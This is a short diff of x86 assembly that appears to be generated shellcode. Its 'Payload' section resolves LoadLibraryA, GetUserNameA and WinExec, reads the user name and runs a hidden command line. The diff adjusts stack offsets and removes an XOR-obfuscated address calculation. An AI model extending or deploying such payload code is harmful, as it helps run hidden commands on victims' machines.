@@ -206,7 +206,7 @@ main:
 
 ; -- Structure Initialization --
 
-; --- CHAR_BUFFER_128 at [ebp-0x100] (0x80 bytes) ---
+; --- CHAR_BUFFER_128 at [ebp-0x180] (0x80 bytes) ---
 ; No initialization template available for CHAR_BUFFER_128.
 
 ; -- Payload --
@@ -237,7 +237,7 @@ wf_hang_1:
 wf_entry:
 
     ; LoadLibraryA(lpLibFileName)
-    lea  eax, [ebp-0x110]
+    lea  eax, [ebp-0x190]
     push eax                      ; lpLibFileName
     call dword ptr [ebp-0x28]
     mov  [ebp-0x3c], eax
@@ -250,10 +250,7 @@ wf_entry:
     ; GetUserNameA
     lea  eax, [ebp-0x38]
     push eax                      ; arg1
-    mov  ecx, 0xfefefe01
-    xor  ecx, 0x01010101
-    add  ecx, ebp
-    mov  eax, ecx
+    lea  eax, [ebp-0x180]
     push eax                      ; arg0
     call dword ptr [ebp-0x2c]
     mov  [ebp-0x40], eax
@@ -268,7 +265,7 @@ wf_run_command:
     ; WinExec(lpCmdLine, uCmdShow)
     xor  eax, eax
     push eax                      ; uCmdShow
-    lea  eax, [ebp-0x118]
+    lea  eax, [ebp-0x198]
     push eax                      ; lpCmdLine
     call dword ptr [ebp-0x30]
     mov  [ebp-0x44], eax
